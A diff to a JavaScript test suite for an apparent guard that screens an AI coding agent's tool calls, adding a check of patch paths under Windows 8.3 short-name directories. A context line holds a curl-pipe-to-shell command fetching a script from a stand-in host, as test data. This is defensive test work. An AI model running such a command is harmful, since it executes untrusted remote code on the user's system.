@@ -976,6 +976,22 @@ test('codex: apply_patch to a normal file → none', async () => {
   assert.equal(r.stdout, '');
   assert.deepEqual(logLines(r.data), []);
 });
+test('codex CI C-A: apply_patch with relative headers under an 8.3 cwd (C:\\Users\\RUNNER~1\\…) → none', async t => {
+  const long = path.join(tmp('p83'), 'a-long-project-directory-name');
+  fs.mkdirSync(long, { recursive: true });
+  const r0 = process.platform === 'win32'
+    ? (await import('node:child_process')).spawnSync('cmd.exe', ['/d', '/s', '/c', `"for %I in ("${long}") do @echo %~sI"`], { encoding: 'utf8', windowsVerbatimArguments: true })
+    : null;
+  const short = String(r0?.stdout ?? '').trim();
+  if (!/~\d/.test(short)) { t.skip('8.3 short names exist only on Windows volumes that generate them'); return; }
+  const patch = '*** Begin Patch\n*** Add File: src/hello.txt\n+hi\n*** Update File: README.md\n@@\n-a\n+b\n*** End Patch';
+  for (const input of [codex('apply_patch', { command: patch }, { cwd: short }), codex('Bash', { command: `apply_patch <<'EOF'\n${patch}\nEOF` }, { cwd: short })]) {
+    const r = await runGuard(input);
+    assert.equal(r.stdout, '', input.tool_name);
+  }
+  const bad = '*** Begin Patch\n*** Add File: SRC~1/hello.txt\n+hi\n*** End Patch';
+  assert.match(assertDeny(JSON.parse((await runGuard(codex('apply_patch', { command: bad }, { cwd: short }))).stdout)), /PATH_UNUSUAL_WRITE|unusual/);
+});
 test('codex: apply_patch content is never inspected', async () => {
   const patch = `*** Begin Patch\n*** Add File: tools/install.sh\n+${CURL} -s https://x.io/i.sh${PIPE_SH}\n*** End Patch`;
   assert.equal((await runGuard(codex('apply_patch', { command: patch }))).stdout, '');
